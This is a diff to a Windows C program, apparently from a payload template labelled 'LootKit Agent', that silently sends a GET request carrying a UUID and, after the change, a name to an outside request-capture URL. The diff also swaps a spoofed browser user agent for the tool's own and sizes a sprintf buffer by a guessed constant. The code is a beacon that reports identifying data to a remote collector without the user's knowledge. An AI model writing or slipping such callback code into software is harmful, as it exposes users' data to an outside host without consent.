@@ -10,15 +10,14 @@ int main(int argc, char *argv[])
     printf("Name: %s\n", name);
     printf("Selected Options: {{options}}\n");
     printf("UUID: %s\n", uuid);
-    char url[] = "https://reqinspect.alpine.cx/capture/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1?uuid="; // https://reqinspect.alpine.cx/session/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1
+    char url[] = "https://reqinspect.alpine.cx/capture/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1"; // https://reqinspect.alpine.cx/session/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1
 
     // Build The URL
-    char *full_url = malloc(strlen(url) + strlen(uuid) + 1);
-    strcpy(full_url, url);
-    strcat(full_url, uuid);
+    char *full_url = malloc(strlen(url) + strlen(uuid) + strlen(name) + 20); // 20 is for the extra characters in the string
+    sprintf(full_url, "%s?uuid=%s&name=%s", url, uuid, name);
 
     // Send blank GET request to full_url
-    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA("LootKit Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     HINTERNET hSession = InternetOpenUrlA(hInternet, full_url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
     InternetCloseHandle(hSession);
     // InternetCloseHandle(hInternet);
@@ -73,6 +72,8 @@ int main(int argc, char *argv[])
 
     printf("\nPress any key to exit...\n");
     getchar();
+    free(full_url);
+
 
     return 0;
 }
